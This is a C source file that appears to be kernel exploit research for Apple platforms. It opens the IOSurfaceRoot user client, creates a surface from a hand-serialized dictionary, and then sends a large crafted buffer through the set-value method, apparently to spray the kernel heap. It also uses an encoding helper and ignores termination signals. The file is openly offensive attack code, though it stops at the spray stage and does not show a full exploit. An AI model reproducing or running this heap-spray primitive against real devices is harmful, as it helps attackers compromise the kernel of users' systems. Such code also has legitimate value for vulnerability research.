#include <signal.h>             // signal
#include <stdint.h>             // uint32_t
#include <stdio.h>              // printf
#include <mach/mach.h>
#include <IOKit/IOKitLib.h>

#define LOG(str, args...) do { printf(str "\n", ##args); } while(0)

const uint64_t IOSURFACE_CREATE_SURFACE_METHOD_INDEX = 0;
const uint64_t IOSURFACE_SET_VALUE_METHOD_INDEX      = 9;

enum
{
    kOSSerializeDictionary      = 0x01000000U,
    kOSSerializeArray           = 0x02000000U,
    kOSSerializeSet             = 0x03000000U,
    kOSSerializeNumber          = 0x04000000U,
    kOSSerializeSymbol          = 0x08000000U,
    kOSSerializeString          = 0x09000000U,
    kOSSerializeData            = 0x0a000000U,
    kOSSerializeBoolean         = 0x0b000000U,
    kOSSerializeObject          = 0x0c000000U,

    kOSSerializeTypeMask        = 0x7F000000U,
    kOSSerializeDataMask        = 0x00FFFFFFU,

    kOSSerializeEndCollection   = 0x80000000U,

    kOSSerializeMagic           = 0x000000d3U,
};

static void ignore(int signo)
{
    /* do nothing */
}

static uint32_t transpose(uint32_t val)
{
    uint32_t ret = 0;
    for(size_t i = 0; val > 0; i += 8)
    {
        ret += (val % 255) << i;
        val /= 255;
    }
    return ret + 0x01010101;
}

int main(void)
{
    kern_return_t ret = 0;
    int r = 0;
    task_t self = mach_task_self();

    signal(SIGTERM, &ignore);
    signal(SIGHUP, &ignore);

    io_service_t hidService = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOHIDSystem"));
    LOG("hidService: %x", hidService);
    if(!MACH_PORT_VALID(hidService)) return -1;

    io_service_t surfaceService = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    LOG("IOSurfaceRoot: %x", surfaceService);
    if(!MACH_PORT_VALID(surfaceService)) return -1;

    io_connect_t surfaceClient = MACH_PORT_NULL;
    ret = IOServiceOpen(surfaceService, self, 0, &surfaceClient);
    LOG("IOSurfaceRootUserClient: %x, %s", surfaceClient, mach_error_string(ret));
    if(ret != KERN_SUCCESS || !MACH_PORT_VALID(surfaceClient)) return -1;

    uint32_t dict_create[] =
    {
        kOSSerializeMagic,
        kOSSerializeEndCollection | kOSSerializeDictionary | 1,

        kOSSerializeSymbol | 19,
        0x75534f49, 0x63616672, 0x6c6c4165, 0x6953636f, 0x657a, // "IOSurfaceAllocSize"
        kOSSerializeEndCollection | kOSSerializeNumber | 32,
        0x1000,
        0x0,

        kOSSerializeSymbol | 23,
        0x75534F49, 0x63616672, 0x65725065, 0x63746566, 0x67615068, 0x7365, // "IOSurfacePrefetchPages"
        kOSSerializeEndCollection | kOSSerializeBoolean | 1,
    };
    uint32_t out[0x1b2];
    size_t outsize = sizeof(out);
    ret = IOConnectCallStructMethod(surfaceClient, IOSURFACE_CREATE_SURFACE_METHOD_INDEX, dict_create, sizeof(dict_create), out, &outsize);
    LOG("newSurface: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS) return -1;
    for(size_t i = 0; i < 0x1b2; ++i)
    {
        LOG("%08x", out[i]);
    }

    uint32_t dict_spray[0xc07] =
    {
        // Some weird header
        0x0,
        0x0,

        kOSSerializeMagic,
        kOSSerializeEndCollection | kOSSerializeArray | 2,

        kOSSerializeData | 0x3000,
    };
    dict_spray[0xc05] = kOSSerializeEndCollection | kOSSerializeString | 4;
    dict_spray[0xc06] = transpose(0);
    uint32_t value;
    outsize = sizeof(value);
    ret = IOConnectCallStructMethod(surfaceClient, IOSURFACE_SET_VALUE_METHOD_INDEX, dict_spray, sizeof(dict_spray), &value, &outsize);
    LOG("setValue: %s", mach_error_string(ret));
    if(ret != KERN_SUCCESS) return -1;

    /*for(size_t i = 0; i < 1000; ++i)
    {
        IOSurfaceRef surface = IOSurfaceCreate(dict);
        LOG("%p", surface);
        LOG("%p, %lu", IOSurfaceGetBaseAddress(surface), IOSurfaceGetAllocSize(surface));
    }*/

    LOG("Done");
    //sleep(1000);

    return 0;
}
